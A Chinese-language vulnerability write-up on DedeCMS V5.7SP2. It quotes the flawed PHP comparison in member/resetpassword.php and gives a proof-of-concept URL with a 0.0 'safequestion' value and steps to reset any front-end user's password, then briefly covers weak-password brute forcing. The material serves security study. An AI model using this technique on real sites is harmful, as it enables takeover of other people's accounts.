dede CMS织梦漏洞合集 (php)

一、相关基础

1-相关介绍

dedecms织梦，是国内最知名的 PHP 开源网站管理系统。作为一款通用型的内容管理系统，广泛应用于新闻、资讯类网站。

二、漏洞介绍

1-前台任意用户密码修改漏洞

【条件&影响】

1、 只影响前台账户，也只能修改未设置安全问题的账户

3、 影响版本：DeDeCMSV5.7SP2 正式版(2018-01-09)

【原理】

逻辑漏洞-弱类型比较攻击

由于前台resetpassword.php中对接受的safeanswer参数类型比较不够严格，遭受弱类型比较攻击

导致了远程攻击者可以在前台会员中心绕过验证，进行任意用户密码重置攻击

  • 漏洞触发位置：dedecms/member/resetpassword.php(75行)
    else if ($dopost == "safequestion") {
    // 从$id中提取数字部分并赋值给$mid
    $mid = preg_replace("#[^0-9]#", "", $id);

    // 构建SQL查询语句，获取对应会员的安全问题和答案
    $sql = "SELECT safequestion, safeanswer, userid, email FROM #@__member WHERE mid = '$mid'";
    
    // 执行查询并获取结果
    $row = $db->GetOne($sql);

    // 如果$safequestion为空，则赋值为空字符串
    if (empty($safequestion)) $safequestion = '';
    // 如果$safeanswer为空，则赋值为空字符串
    if (empty($safeanswer)) $safeanswer = '';

    // 比较用户输入的安全问题和答案是否与数据库中的匹配
    if ($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer) {
        // 调用sn函数，并传递会员ID、用户ID、邮箱和'N'参数
        sn($mid, $row['userid'], $row['email'], 'N');
        exit();
    } else {
        // 显示错误信息，并退出
        ShowMsg("对不起，您的安全问题或答案回答错误", "-1");
        exit();
    }
}

【poc&利用过程】

环境搭建参考：https://blog.csdn.net/weixin_52497013/article/details/121468861

1、构建一个携带“保密问题为空、答案为空”参数的url请求：

http://127.0.0.1:9090/member/resetpassword.php？dopost=safequestion&safequestion=0.0&safeanswer=&id=2

这里id参数是某个没有设置密保问题的用户的“用户id”

2、获得临时验证码

bp抓包，会看到url这里被它的服务端自动填上了一个临时验证码：

这个临时验证码好像就是表示“修改密码成功”的凭证，其可以对这个刚刚uid的用户生效

3、访问该用户的“找回密码界面”

写进去刚刚的“临时验证码”，就可以成功登录

2-弱密码爆破

【介绍】

因为这个系统在创建密码的时候要求不严格，所以用户可以注册一些有弱密码的账号

攻击者可以进行弱密码爆破尝试
